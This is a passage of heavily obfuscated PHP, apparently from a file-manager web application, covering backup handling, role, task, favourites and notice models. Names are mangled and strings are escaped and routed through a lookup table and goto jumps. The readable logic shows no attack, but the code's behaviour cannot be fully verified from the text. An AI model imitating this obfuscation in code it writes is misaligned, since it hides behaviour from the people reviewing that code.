(isset($—“ğ‘à»[$’ø¿Éú€[293]][$’ø¿Éú€[199]][$’ø¿Éú€[477]])) { $Œ±¤Ğ = (int) $—“ğ‘à»[$’ø¿Éú€[293]][$’ø¿Éú€[199]][$’ø¿Éú€[477]]; } if (self::$manual == 0 && $—“ğ‘à»[$’ø¿Éú€[32]] == self::$name) { Model($’ø¿Éú€[759])->remove($—“ğ‘à»[$’ø¿Éú€[399]]); } $—“ğ‘à» = $this->initData($Œ±¤Ğ, $—“ğ‘à»[$’ø¿Éú€[762]]); } else { $this->checkStore($—“ğ‘à»[$’ø¿Éú€[762]]); } } self::$option = $—“ğ‘à»; } private function isManual() { $»óÁ® = _get($GLOBALS, $_SERVER[ïëó©ÒÚ][763], 0); $»óÁ® = intval($»óÁ®); self::$manual = $»óÁ® && $»óÁ® == 1 ? 1 : 0; } private function initData($ªª‡¤ÑŞ = 0, $ÛÎÉŞâ¹ = '') { $…®¤‡ƒÚ =& $_SERVER[ïëó©ÒÚ]; $§æ™Ğ¼× = Model($…®¤‡ƒÚ[759])->config(); if ($ÛÎÉŞâ¹ && $§æ™Ğ¼×[$…®¤‡ƒÚ[762]] != $ÛÎÉŞâ¹) { $ªª‡¤ÑŞ = 0; } $this->checkStore($§æ™Ğ¼×[$…®¤‡ƒÚ[762]]); if (self::$manual == 1) { self::$name .= $…®¤‡ƒÚ[11] . date($…®¤‡ƒÚ[764]); } $Æƒ³É = array($…®¤‡ƒÚ[762] => $§æ™Ğ¼×[$…®¤‡ƒÚ[762]], $…®¤‡ƒÚ[32] => self::$name, $…®¤‡ƒÚ[760] => 0, $…®¤‡ƒÚ[765] => $§æ™Ğ¼×[$…®¤‡ƒÚ[765]], $…®¤‡ƒÚ[766] => self::$manual, $…®¤‡ƒÚ[293] => array($…®¤‡ƒÚ[767] => array($…®¤‡ƒÚ[760] => 0), $…®¤‡ƒÚ[768] => array($…®¤‡ƒÚ[760] => 0, $…®¤‡ƒÚ[769] => 0, $…®¤‡ƒÚ[770] => 0, $…®¤‡ƒÚ[33] => $…®¤‡ƒÚ[12], $…®¤‡ƒÚ[771] => 0, $…®¤‡ƒÚ[506] => 0), $…®¤‡ƒÚ[772] => array($…®¤‡ƒÚ[760] => 0, $…®¤‡ƒÚ[769] => 0, $…®¤‡ƒÚ[770] => 0, $…®¤‡ƒÚ[771] => 0, $…®¤‡ƒÚ[506] => 0), $…®¤‡ƒÚ[199] => array($…®¤‡ƒÚ[760] => 0, $…®¤‡ƒÚ[773] => 0, $…®¤‡ƒÚ[774] => 0, $…®¤‡ƒÚ[775] => 0, $…®¤‡ƒÚ[776] => 0, $…®¤‡ƒÚ[477] => $ªª‡¤ÑŞ, $…®¤‡ƒÚ[771] => 0, $…®¤‡ƒÚ[506] => 0)), $…®¤‡ƒÚ[771] => time(), $…®¤‡ƒÚ[506] => 0); $ÓÜ›ºÌØ = Model($…®¤‡ƒÚ[759])->insert($Æƒ³É); $Æƒ³É[$…®¤‡ƒÚ[399]] = $ÓÜ›ºÌØ; return $Æƒ³É; } private function checkStore($Ê†§â‡Ş) { $ß Œğ²Û =& $_SERVER[ïëó©ÒÚ]; $ï©áöÃ = Model($ß Œğ²Û[777])->listData($Ê†§â‡Ş); Model($ß Œğ²Û[777])->checkConfig($ï©áöÃ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ïëó©ÒÚ][759])->findByName(self::$name); } return self::$option; } public static function set($¼µĞ‘ÎÁ) { $×Î¡‘ =& $_SERVER[ïëó©ÒÚ]; $‚”€»œŠ = self::get(); foreach ($¼µĞ‘ÎÁ as $–©¡ı¡ı => $µàÒÂúŒ) { $‹ÏÌ¿“¸ = explode($×Î¡‘[10], $–©¡ı¡ı); $è¾å…€ù = count($‹ÏÌ¿“¸); switch ($è¾å…€ù) { case 1: $‚”€»œŠ[$‹ÏÌ¿“¸[0]] = $µàÒÂúŒ; break; case 2: $‚”€»œŠ[$‹ÏÌ¿“¸[0]][$‹ÏÌ¿“¸[1]] = $µàÒÂúŒ; break; case 3: $‚”€»œŠ[$‹ÏÌ¿“¸[0]][$‹ÏÌ¿“¸[1]][$‹ÏÌ¿“¸[2]] = $µàÒÂúŒ; break; } } Model($×Î¡‘[759])->update($‚”€»œŠ[$×Î¡‘[399]], $‚”€»œŠ); self::$option = $‚”€»œŠ; return self::$option; } public function keep() { $Ëƒİ‚‚ =& $_SERVER[ïëó©ÒÚ]; $ÓİˆË¹ = self::get(); if ($ÓİˆË¹[$Ëƒİ‚‚[293]][$Ëƒİ‚‚[767]][$Ëƒİ‚‚[760]] == $Ëƒİ‚‚[88]) { return; } $this->backupKeep($ÓİˆË¹); self::set(array($Ëƒİ‚‚[778] => 1)); } private function backupKeep($·—æ“ü) { $ı’Öšä´ =& $_SERVER[ïëó©ÒÚ]; if (self::$manual == 1) { return; } $ƒµ´èà = Model($ı’Öšä´[759])->listData(); if (empty($ƒµ´èà)) { return; } $ë©ûÖÓ = 0; $ÜÏ¦‚ğÈ = array(); foreach ($ƒµ´èà as $¾‘ú‰ã©) { if ($ë©ûÖÓ >= 7) { break; } $ÜÏ¦‚ğÈ[] = $¾‘ú‰ã©[$ı’Öšä´[32]]; $ë©ûÖÓ++; } for ($ë©ûÖÓ = 0; $ë©ûÖÓ < 12; $ë©ûÖÓ++) { $ÜÏ¦‚ğÈ[] = date($ı’Öšä´[779], strtotime("\55{$ë©ûÖÓ}\x20\x6d\x6f\156\x74\x68\x73")); } $ÜÏ¦‚ğÈ = array_unique($ÜÏ¦‚ğÈ); $‡©¿«Èé = Model($ı’Öšä´[780])->get($ı’Öšä´[781]); foreach ($ƒµ´èà as $¾‘ú‰ã©) { if (isset($¾‘ú‰ã©[$ı’Öšä´[766]]) && $¾‘ú‰ã©[$ı’Öšä´[766]] == $ı’Öšä´[88]) { continue; } if (!empty($¾‘ú‰ã©[$ı’Öšä´[32]]) && in_array($¾‘ú‰ã©[$ı’Öšä´[32]], $ÜÏ¦‚ğÈ)) { continue; } Model($ı’Öšä´[759])->remove($¾‘ú‰ã©[$ı’Öšä´[399]]); $Öô¡í÷ = $this->backupPath($·—æ“ü, $‡©¿«Èé); IO::remove($Öô¡í÷, !1); } } private function backupPath($ËÓÃì‹î, $¿÷¶ë²‚ = false) { $·š©¥À˜ =& $_SERVER[ïëó©ÒÚ]; if (!$¿÷¶ë²‚) { $¿÷¶ë²‚ = Model($·š©¥À˜[780])->get($·š©¥À˜[781]); } $³Œóáº = $ËÓÃì‹î[$·š©¥À˜[32]]; $æ±åá— = substr(md5($·š©¥À˜[782] . $¿÷¶ë²‚ . $³Œóáº), 0, 8); return "\x7b\x69\157\x3a{$ËÓÃì‹î[$·š©¥À˜[762]]}\175\57\144\141\164\141\x62\x61\163\145\57\x62\141\143\x6b\x75\160\57" . $³Œóáº . $·š©¥À˜[11] . $æ±åá—; } public function db() { $µ´Š–â =& $_SERVER[ïëó©ÒÚ]; $Ä¬ÚÆÊ = self::get(); if ($Ä¬ÚÆÊ[$µ´Š–â[293]][$µ´Š–â[768]][$µ´Š–â[760]] == $µ´Š–â[88]) { return !0; } $Á¶Î°Ò = new BackupDb(); if (!$Á¶Î°Ò->index()) { return !1; } self::set(array($µ´Š–â[783] => 1)); return !0; } public function dbFile() { $°‹Àê€ =& $_SERVER[ïëó©ÒÚ]; $¬º¬÷µ­ = self::get(); if ($¬º¬÷µ­[$°‹Àê€[293]][$°‹Àê€[772]][$°‹Àê€[760]] == $°‹Àê€[88]) { return !0; } $úÄšôÂı = new BackupDbFile(); if (!$úÄšôÂı->index()) { return !1; } self::set(array($°‹Àê€[784] => 1)); return !0; } public function file() { $¡°†ë÷å =& $_SERVER[ïëó©ÒÚ]; $ ñ“­Ê” = self::get(); if ($ ñ“­Ê”[$¡°†ë÷å[293]][$¡°†ë÷å[199]][$¡°†ë÷å[760]] == $¡°†ë÷å[88]) { return !0; } if (!isset($ ñ“­Ê”[$¡°†ë÷å[765]]) || $ ñ“­Ê”[$¡°†ë÷å[765]] == $¡°†ë÷å[197]) { $ÙÃ‡¨¥Û = new BackupFile(); if (!$ÙÃ‡¨¥Û->index()) { return !1; } } self::set(array($¡°†ë÷å[785] => 1, $¡°†ë÷å[760] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $íè›õ¥¢ =& $_SERVER[ïëó©ÒÚ]; $Çš‘ÂÕÄ = Backup::get(); self::$io = $Çš‘ÂÕÄ[$íè›õ¥¢[762]]; self::$name = $Çš‘ÂÕÄ[$íè›õ¥¢[32]]; $‘»›ÙÓ™ = new DbManage(); $ò¯ñ¾°¿ = $‘»›ÙÓ™->dbType(); $ã½™ÖÑª = array($íè›õ¥¢[786] => $ò¯ñ¾°¿, $íè›õ¥¢[787] => time()); Backup::set($ã½™ÖÑª); $ğœô°µö = $this->tmpFilesPath() . $íè›õ¥¢[788] . self::$name . $íè›õ¥¢[8]; del_dir($ğœô°µö); mk_dir($ğœô°µö); $îõËÜÇå = $›•ùÊÜ× = 0; $¨´·²å = new Task($íè›õ¥¢[789], $íè›õ¥¢[790], 0, LNG($íè›õ¥¢[791]) . $íè›õ¥¢[792] . LNG($íè›õ¥¢[793])); try { $¢ßÎ·ïº = $‘»›ÙÓ™->db()->getTables(); } catch (Exception $×‡ûúÆÄ) { $¨´·²å->end(); return !1; } $¢ßÎ·ïº = array_diff($¢ßÎ·ïº, array($íè›õ¥¢[794], $íè›õ¥¢[795])); foreach ($¢ßÎ·ïº as $ç¸˜·) { $îõËÜÇå += $‘»›ÙÓ™->model($ç¸˜·)->count(); } $¨´·²å->task[$íè›õ¥¢[796]] = $îõËÜÇå; $GLOBALS[$íè›õ¥¢[797]] = self::$name; foreach ($¢ßÎ·ïº as $ç¸˜·) { $¶Ì§¤Ì¿ = $ğœô°µö . $ç¸˜· . $íè›õ¥¢[798]; $ŠôäÁ‘ = null; if ($ç¸˜· == $íè›õ¥¢[799] && (!isset($Çš‘ÂÕÄ[$íè›õ¥¢[765]]) || $Çš‘ÂÕÄ[$íè›õ¥¢[765]] == $íè›õ¥¢[197])) { $ŠôäÁ‘ = self::$io; } $›•ùÊÜ× += $‘»›ÙÓ™->sqlFromDb($ç¸˜·, $¶Ì§¤Ì¿, $¨´·²å, $ŠôäÁ‘); } unset($GLOBALS[$íè›õ¥¢[797]]); $¨´·²å->end(); if ($›•ùÊÜ× > $îõËÜÇå) { $îõËÜÇå = $›•ùÊÜ×; } $ã½™ÖÑª = array($íè›õ¥¢[786] => $ò¯ñ¾°¿, $íè›õ¥¢[783] => 1, $íè›õ¥¢[800] => $îõËÜÇå, $íè›õ¥¢[801] => $›•ùÊÜ×, $íè›õ¥¢[802] => time()); Backup::set($ã½™ÖÑª); if ($îõËÜÇå - $›•ùÊÜ× > 0) { $§¬•…È = $íè›õ¥¢[803]; if (stristr(I18n::getType(), $íè›õ¥¢[804])) { $§¬•…È = $íè›õ¥¢[805]; } write_log(array($§¬•…È, $ã½™ÖÑª), $íè›õ¥¢[790]); return !1; } return !0; } private function tmpFilesPath() { $íª…Ê—ª =& $_SERVER[ïëó©ÒÚ]; $èÕ†Í¤É = TEMP_FILES; if ($GLOBALS[$íª…Ê—ª[6]][$íª…Ê—ª[89]][$íª…Ê—ª[806]]) { $èÕ†Í¤É = $GLOBALS[$íª…Ê—ª[6]][$íª…Ê—ª[89]][$íª…Ê—ª[806]]; if (!mk_dir($èÕ†Í¤É) || !is_writable($èÕ†Í¤É) || !IO::mkfile($èÕ†Í¤É . $íª…Ê—ª[807])) { $èÕ†Í¤É = TEMP_FILES; } } return $èÕ†Í¤É; } } goto FâÔÆèÜÖ; a‰µââÛ´Ü: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\x72\x6f\154\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\141\165\164\150", "\x6c\x61\142\145\154", "\x64\x69\x73\160\154\141\171", "\163\x79\x73\164\145\x6d", "\144\145\x73\x63", "\151\x67\156\x6f\x72\x65\105\x78\164", "\151\147\x6e\x6f\x72\145\106\x69\154\145\123\151\172\x65", "\x61\144\155\x69\x6e\151\x73\x74\162\141\x74\x6f\x72", "\163\x6f\162\x74"); public function listData($ş‚İ•Üè = false, $•†»½—® = "\163\x6f\162\164", $´¼°ªë¥ = false) { $‹´Ò®ê¿ =& $_SERVER[ïëó©ÒÚ]; $ğÅµÀäœ = parent::listData($ş‚İ•Üè, $•†»½—®, $´¼°ªë¥); if (!$ş‚İ•Üè) { foreach ($ğÅµÀäœ as $ÜÕõëÒÜ => $¡Ïªù÷Â) { if ($¡Ïªù÷Â[$‹´Ò®ê¿[2031]] == 1) { $ğÅµÀäœ[$ÜÕõëÒÜ][$‹´Ò®ê¿[462]] = LNG($‹´Ò®ê¿[2265]); } } } return $ğÅµÀäœ; } public function update($­ÄÅ†Õ¯, $ÕëÌ¿ƒƒ) { $”—™¸‚ =& $_SERVER[ïëó©ÒÚ]; $¥›†È°Å = parent::listData($­ÄÅ†Õ¯); $âÍ˜ôò = $this->findByName($ÕëÌ¿ƒƒ[$”—™¸‚[32]]); if (!$¥›†È°Å || $âÍ˜ôò && $âÍ˜ôò[$”—™¸‚[399]] != $¥›†È°Å[$”—™¸‚[399]]) { return !1; } if ($âÍ˜ôò[$”—™¸‚[2031]] == 1) { $ÕëÌ¿ƒƒ = array($”—™¸‚[32] => $ÕëÌ¿ƒƒ[$”—™¸‚[32]], $”—™¸‚[1856] => $ÕëÌ¿ƒƒ[$”—™¸‚[1856]]); } $this->filterAuth($ÕëÌ¿ƒƒ[$”—™¸‚[422]]); return parent::update($­ÄÅ†Õ¯, $ÕëÌ¿ƒƒ); } public function remove($Š”æÆ´) { $İ‚¼âªÖ = parent::listData($Š”æÆ´); if (!$İ‚¼âªÖ || $İ‚¼âªÖ[$_SERVER[ïëó©ÒÚ][1279]]) { return !1; } return parent::remove($Š”æÆ´); } public function add($ßóæ•„«) { $„–ò¡Óï =& $_SERVER[ïëó©ÒÚ]; $õèòÈå = $ßóæ•„«[$„–ò¡Óï[32]]; if ($this->findByName($õèòÈå)) { return !1; } $ºÎ¦ä¼¸ = array($„–ò¡Óï[429] => $õèòÈå, $„–ò¡Óï[1839] => $„–ò¡Óï[12], $„–ò¡Óï[1835] => $„–ò¡Óï[1843], $„–ò¡Óï[2266] => 1, $„–ò¡Óï[1838] => 0, $„–ò¡Óï[2267] => 0, $„–ò¡Óï[1837] => $this->getSort()); $ßóæ•„« = array_merge($ºÎ¦ä¼¸, $ßóæ•„«); $this->filterAuth($ßóæ•„«[$„–ò¡Óï[422]]); return parent::insert($ßóæ•„«); } private function getSort() { $„¶åÛ–œ =& $_SERVER[ïëó©ÒÚ]; $¼¯ìë’Ñ = parent::listData(); $ë·”ËÍ = array_to_keyvalue($¼¯ìë’Ñ, $„¶åÛ–œ[12], $„¶åÛ–œ[1857]); return empty($ë·”ËÍ) ? 0 : max($ë·”ËÍ) + 1; } private function filterAuth(&$¯ôú‘É) { $«£¬‡Íô =& $_SERVER[ïëó©ÒÚ]; $Ó½˜Ò = array(); $ıÏşåÎÌ = array_filter(explode($«£¬‡Íô[50], $¯ôú‘É)); foreach ($ıÏşåÎÌ as $¯ôú‘É) { $Ì÷³öÎË = explode($«£¬‡Íô[10], $¯ôú‘É); if ($Ì÷³öÎË[0] == $«£¬‡Íô[2268] && $Ì÷³öÎË[1] != $«£¬‡Íô[1198]) { $Ç¿ÓÀ¢† = $Ì÷³öÎË[0] . $«£¬‡Íô[10] . $Ì÷³öÎË[1] . $«£¬‡Íô[2269]; if (!in_array($Ç¿ÓÀ¢†, $ıÏşåÎÌ)) { $Ó½˜Ò[] = $Ç¿ÓÀ¢†; } } $Ó½˜Ò[] = $¯ôú‘É; } $¯ôú‘É = implode($«£¬‡Íô[50], $Ó½˜Ò); } public function findRoleDefault() { $Çæçòœ¸ =& $_SERVER[ïëó©ÒÚ]; $‚¬ªÅœú = parent::listData(); $Ò¸ÏÏƒÅ = !1; foreach ($‚¬ªÅœú as $“ş¨©ª§) { if (!$“ş¨©ª§ || $“ş¨©ª§[$Çæçòœ¸[1855]] == $Çæçòœ¸[197] || $“ş¨©ª§[$Çæçòœ¸[2031]] == 1) { continue; } if (strstr($“ş¨©ª§[$Çæçòœ¸[422]], $Çæçòœ¸[2270])) { continue; } if (!strstr($“ş¨©ª§[$Çæçòœ¸[422]], $Çæçòœ¸[2271])) { continue; } if (!$Ò¸ÏÏƒÅ) { $Ò¸ÏÏƒÅ = $“ş¨©ª§; continue; } $Á§„µË¡ = explode($Çæçòœ¸[50], $Ò¸ÏÏƒÅ[$Çæçòœ¸[422]]); $İ§»‡œ– = explode($Çæçòœ¸[50], $“ş¨©ª§[$Çæçòœ¸[422]]); if (count($Á§„µË¡) > count($İ§»‡œ–)) { $Ò¸ÏÏƒÅ = $“ş¨©ª§; } } return $Ò¸ÏÏƒÅ ? $Ò¸ÏÏƒÅ[$Çæçòœ¸[399]] : $Çæçòœ¸[12]; } public function sort($©¶‰˜É, $â§«€Ç) { return parent::update($©¶‰˜É, $â§«€Ç); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\164\x61\163\x6b\114\x69\163\x74"; public $field = array("\x6e\141\155\x65", "\x74\171\x70\x65", "\145\166\145\x6e\164", "\x74\x69\x6d\145", "\144\145\x73\143", "\x73\171\x73\x74\145\x6d", "\145\x6e\x61\x62\x6c\145", "\x6c\141\x73\164\x52\x75\x6e", "\163\157\x72\x74"); public function listData($»ù¥¾ø® = false, $¡±›šú = "\x73\x6f\x72\x74", $êÇ•İÔ· = false) { return parent::listData($»ù¥¾ø®, $¡±›šú, $êÇ•İÔ·); } public function add($Ö’ûÏ»‹) { $ÚÈÀÉº =& $_SERVER[ïëó©ÒÚ]; $í®†³± = $this->findByName($Ö’ûÏ»‹[$ÚÈÀÉº[32]]); if ($í®†³±) { return !1; } $Ö’ûÏ»‹[$ÚÈÀÉº[1621]] = 0; $Ö’ûÏ»‹[$ÚÈÀÉº[1857]] = $this->getSort(); return parent::insert($Ö’ûÏ»‹); } private function getSort() { $èƒ—Ëş =& $_SERVER[ïëó©ÒÚ]; $å‡²ºéà = parent::listData(); $ı†èçş = array_to_keyvalue($å‡²ºéà, $èƒ—Ëş[12], $èƒ—Ëş[1857]); return empty($ı†èçş) ? 0 : max($ı†èçş) + 1; } public function update($îí‹âÒ·, $£„°‘ØÙ) { $’ÀŸÚÉú =& $_SERVER[ïëó©ÒÚ]; $‘õ¹Œ›Ú = $this->listData($îí‹âÒ·); $¡Á²ÔÇ› = $this->findByName($£„°‘ØÙ[$’ÀŸÚÉú[32]]); if (!$‘õ¹Œ›Ú || $¡Á²ÔÇ› && $¡Á²ÔÇ›[$’ÀŸÚÉú[399]] != $‘õ¹Œ›Ú[$’ÀŸÚÉú[399]]) { return !1; } return parent::update($îí‹âÒ·, $£„°‘ØÙ); } public function remove($ê‰¼”Ëƒ, $Á©Í¯ ¨ = false) { $¹ÓÆí¢ =& $_SERVER[ïëó©ÒÚ]; $ğŠî¦€ = $this->listData($ê‰¼”Ëƒ); if (!$ğŠî¦€) { return; } if (!$Á©Í¯ ¨ && $ğŠî¦€[$¹ÓÆí¢[1279]] == $¹ÓÆí¢[88]) { return !1; } return parent::remove($ê‰¼”Ëƒ); } public function enable($¬ò±ĞşÈ, $ºÕºÂÄ) { return $this->update($¬ò±ĞşÈ, array($_SERVER[ïëó©ÒÚ][2260] => $ºÕºÂÄ)); } public function run($àÜ–ˆá’) { return $this->update($àÜ–ˆá’, array($_SERVER[ïëó©ÒÚ][2272] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($¦Â€Ä’Í) { $°À©ê =& $_SERVER[ïëó©ÒÚ]; return array($°À©ê[1944] => array(USER_ID, $°À©ê[2273])); } protected function listData() { $ôÆˆª£ =& $_SERVER[ïëó©ÒÚ]; $¸”Ú±“ë = array($ôÆˆª£[1652] => USER_ID, $ôÆˆª£[493] => 0); $Ñı‹¥ÜÕ = $ôÆˆª£[2274]; $àÃàğÇü = $this->field($Ñı‹¥ÜÕ)->where($¸”Ú±“ë)->order($ôÆˆª£[2275])->select(); return $àÃàğÇü ? $àÃàğÇü : array(); } protected function resetCache() { } protected function listView() { $éšÎõÙ„ =& $_SERVER[ïëó©ÒÚ]; $µõÊ‘½ = $this->listData(); $ÍòŸù¦µ = array_filter_by_field($µõÊ‘½, $éšÎõÙ„[33], $éšÎõÙ„[425]); $É­ÇÑ¿Ÿ = array_to_keyvalue($ÍòŸù¦µ, $éšÎõÙ„[12], $éšÎõÙ„[84]); if (!$É­ÇÑ¿Ÿ) { return $µõÊ‘½; } $Ö±¦É´÷ = 2000; $Ûû—¦«ß = array($éšÎõÙ„[426] => array($éšÎõÙ„[427], $É­ÇÑ¿Ÿ)); $ñ­öÖí† = Model($éšÎõÙ„[835])->listSource($Ûû—¦«ß, $Ö±¦É´÷); $ñ­öÖí† = array_merge($ñ­öÖí†[$éšÎõÙ„[83]], $ñ­öÖí†[$éšÎõÙ„[82]]); $ñ­öÖí† = array_to_keyvalue($ñ­öÖí†, $éšÎõÙ„[411]); foreach ($µõÊ‘½ as $‰‹¥Ş‹« => $¬™âøë) { $ÄÔê¹Ñ = $ñ­öÖí†[$¬™âøë[$éšÎõÙ„[84]]]; $ÄÔê¹Ñ = $ÄÔê¹Ñ ? $ÄÔê¹Ñ : array(); $µõÊ‘½[$‰‹¥Ş‹«] = array_merge($ÄÔê¹Ñ, $¬™âøë); } return $µõÊ‘½; } protected function addFav($Ô¹®Ùç¼, $€’ÙÜ¨’ = '', $±¬¡µÇ = "\163\x6f\x75\x72\143\x65") { $‘Ó¨íŞ =& $_SERVER[ïëó©ÒÚ]; $¶Š›Î½… = array($‘Ó¨íŞ[1652] => USER_ID, $‘Ó¨íŞ[493] => 0, $‘Ó¨íŞ[431] => $±¬¡µÇ, $‘Ó¨íŞ[430] => $Ô¹®Ùç¼); if ($this->where($¶Š›Î½…)->find()) { return !1; } $¶Š›Î½… = array($‘Ó¨íŞ[1652] => USER_ID, $‘Ó¨íŞ[493] => 0); $ÅîÜªıı = $this->where($¶Š›Î½…)->max($‘Ó¨íŞ[1857]); if (!$ÅîÜªıı) { $ÅîÜªıı = 0; } if (!$€’ÙÜ¨’ && $±¬¡µÇ == $‘Ó¨íŞ[425]) { $ü´—ë’ = Model($‘Ó¨íŞ[1330])->where(array($‘Ó¨íŞ[426] => $Ô¹®Ùç¼))->find(); if (!$ü´—ë’) { return !1; } $€’ÙÜ¨’ = $ü´—ë’[$‘Ó¨íŞ[32]]; } $€’ÙÜ¨’ = $this->getAutoName($€’ÙÜ¨’); $“ìœ¥îÜ = array($‘Ó¨íŞ[1652] => USER_ID, $‘Ó¨íŞ[493] => 0, $‘Ó¨íŞ[429] => $€’ÙÜ¨’, $‘Ó¨íŞ[430] => $Ô¹®Ùç¼, $‘Ó¨íŞ[431] => $±¬¡µÇ, $‘Ó¨íŞ[1837] => $ÅîÜªıı + 1); return $this->add($“ìœ¥îÜ); } protected function remove($âÍğı‰) { $º­Ú© =& $_SERVER[ïëó©ÒÚ]; $ŠÏá–¹ = array($º­Ú©[1652] => USER_ID, $º­Ú©[428] => $âÍğı‰); return $this->where($ŠÏá–¹)->delete(); } protected function removeByName($Îşüõ›) { $€ÚçŞÛ =& $_SERVER[ïëó©ÒÚ]; $‡êßäûÚ = array($€ÚçŞÛ[1652] => USER_ID, $€ÚçŞÛ[429] => $Îşüõ›, $€ÚçŞÛ[493] => 0); return $this->where($‡êßäûÚ)->delete(); } protected function rename($üÊùÌÊ, $¶¿¢Åå¡) { $­ šø©­ =& $_SERVER[ïëó©ÒÚ]; if ($üÊùÌÊ == $¶¿¢Åå¡) { return !1; } $à”ËÏé¨ = $this->getAutoName($¶¿¢Åå¡); if ($¶¿¢Åå¡ != $à”ËÏé¨) { return !1; } $¢ÇŒÒŒ‡ = array($­ šø©­[1652] => USER_ID, $­ šø©­[493] => 0, $­ šø©­[32] => $üÊùÌÊ); return $this->where($¢ÇŒÒŒ‡)->save(array($­ šø©­[32] => $¶¿¢Åå¡)); } protected function resetSort($˜ÉÊÑÓ) { $»í„íİ =& $_SERVER[ïëó©ÒÚ]; $˜ÉÊÑÓ = is_array($˜ÉÊÑÓ) ? $˜ÉÊÑÓ : array(); $ƒ©ü¯ãŞ = array($»í„íİ[1652] => USER_ID); for ($µ‚ş‘›Ì = 0; $µ‚ş‘›Ì < count($˜ÉÊÑÓ); $µ‚ş‘›Ì++) { $ƒ©ü¯ãŞ[$»í„íİ[428]] = $˜ÉÊÑÓ[$µ‚ş‘›Ì]; $this->where($ƒ©ü¯ãŞ)->save(array($»í„íİ[1837] => $µ‚ş‘›Ì + 1)); } return !0; } protected function moveTop($²šá®¤•) { $–ÛÊ›à½ =& $_SERVER[ïëó©ÒÚ]; $’©ìœÎ = array($–ÛÊ›à½[1652] => USER_ID, $–ÛÊ›à½[493] => 0); $Š‚¶¸Í = $this->where($’©ìœÎ)->where(array($–ÛÊ›à½[32] => $²šá®¤•))->find(); if (!$Š‚¶¸Í) { return; } $ÒûËˆï¹ = $this->field($–ÛÊ›à½[399])->where($’©ìœÎ)->order($–ÛÊ›à½[2275])->select(); $ÒûËˆï¹ = array_to_keyvalue($ÒûËˆï¹, $–ÛÊ›à½[12], $–ÛÊ›à½[399]); $Ü§šî…õ = $ÒûËˆï¹; $ÒûËˆï¹ = array_remove_value($ÒûËˆï¹, $Š‚¶¸Í[$–ÛÊ›à½[399]]); array_unshift($ÒûËˆï¹, $Š‚¶¸Í[$–ÛÊ›à½[399]]); return $this->resetSort($ÒûËˆï¹); } protected function moveBottom($ÊêÊû¢¾) { $œî¤˜Õ– =& $_SERVER[ïëó©ÒÚ]; $´ÏÃö“Â = array($œî¤˜Õ–[1652] => USER_ID, $œî¤˜Õ–[493] => 0); $ÁŞœÄÈš = $this->where($´ÏÃö“Â)->max($œî¤˜Õ–[1857]); $—™æ¥ò = array($œî¤˜Õ–[1857] => $ÁŞœÄÈš + 1); return $this->where($´ÏÃö“Â)->where(array($œî¤˜Õ–[32] => $ÊêÊû¢¾))->save($—™æ¥ò); } private function getAutoName($”…‚¼¿Œ) { $©‡İ‹¢ =& $_SERVER[ïëó©ÒÚ]; $½ÖçßÂ‘ = array($©‡İ‹¢[1652] => USER_ID, $©‡İ‹¢[493] => 0); $í–ŒÈõ = $this->field($©‡İ‹¢[32])->where($½ÖçßÂ‘)->select(); $í–ŒÈõ = array_to_keyvalue($í–ŒÈõ, $©‡İ‹¢[12], $©‡İ‹¢[32]); if (!$í–ŒÈõ || !in_array($”…‚¼¿Œ, $í–ŒÈõ)) { return $”…‚¼¿Œ; } for ($Òù¨ë»… = 0; $Òù¨ë»… < count($í–ŒÈõ); $Òù¨ë»…++) { if (!in_array($”…‚¼¿Œ . "\50{$Òù¨ë»…}\x29", $í–ŒÈõ)) { return $”…‚¼¿Œ . "\x28{$Òù¨ë»…}\51"; } } return $”…‚¼¿Œ . "\x28{$Òù¨ë»…}\51"; } } goto BéÜöÄÑ¼‘; EÎĞÀÏ®¨Ø: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\x6e\x6f\164\x69\143\x65\114\151\x73\164"; public $field = array("\x6e\141\155\145", "\x63\157\156\x74\145\x6e\164", "\x61\165\x74\x68", "\155\x6f\144\145", "\x74\151\x6d\145", "\x74\171\160\145", "\154\145\166\145\x6c", "\145\156\141\x62\154\x65", "\x73\157\162\x74"); public function listData($¿ŠÏ¨¿é = false, $Ó•ëÁœ£ = "\163\x6f\162\x74", $Áô££ı— = false) { return parent::listData($¿ŠÏ¨¿é, $Ó•ëÁœ£, $Áô££ı—); } public function add($óÌ¼˜áÀ) { $ÙÎ‘¸Ùè =& $_SERVER[ïëó©ÒÚ]; $ë‰Û¤³½ = time(); if ($óÌ¼˜áÀ[$ÙÎ‘¸Ùè[16]] == $ÙÎ‘¸Ùè[2259]) { $ë‰Û¤³½ = strtotime($óÌ¼˜áÀ[$ÙÎ‘¸Ùè[203]]); } $óÌ¼˜áÀ[$ÙÎ‘¸Ùè[203]] = $ë‰Û¤³½; return parent::insert($óÌ¼˜áÀ); } public function update($µíöíø, $û˜¨²º) { $ûòÁ‹¬Ô =& $_SERVER[ïëó©ÒÚ]; $Í–â–ô… = $this->listData($µíöíø); if (!$Í–â–ô…) { return !1; } $‘­™óöÜ = time(); if ($û˜¨²º[$ûòÁ‹¬Ô[16]] == $ûòÁ‹¬Ô[2259]) { $‘­™óöÜ = strtotime($û˜¨²º[$ûòÁ‹¬Ô[203]]); } $û˜¨²º[$ûòÁ‹¬Ô[203]] = $‘­™óöÜ; return parent::update($µíöíø, $û˜¨²º); } public function remove($ÓòÄ—ˆ) { $’úä¶¢Ï = $this->listData($ÓòÄ—ˆ); if (!$’úä¶¢Ï || $’úä¶¢Ï[$_SERVER[ïëó©ÒÚ][1279]]) { return !1; } return parent::remove($ÓòÄ—ˆ); } public function sort($“ô¤¾Ğ—, $ ¡âçõñ) { return parent::update($“ô¤¾Ğ—, $ ¡âçõñ); } public function enable($ñå²À, $âÏ’”ĞÎ) { return parent::update($ñå²À, array($_SERVER[ïëó©ÒÚ][2260] => $âÏ’”ĞÎ)); } private function initUserOption() { $‡ıÑ¸ç =& $_SERVER[ïëó©ÒÚ]; $this->optionType = $‡ıÑ¸ç[2261]; $this->modelType = $‡ıÑ¸ç[2262]; $this->field = array($‡ıÑ¸ç[2263], $‡ıÑ¸ç[32], $‡ıÑ¸ç[203], $‡ıÑ¸ç[33], 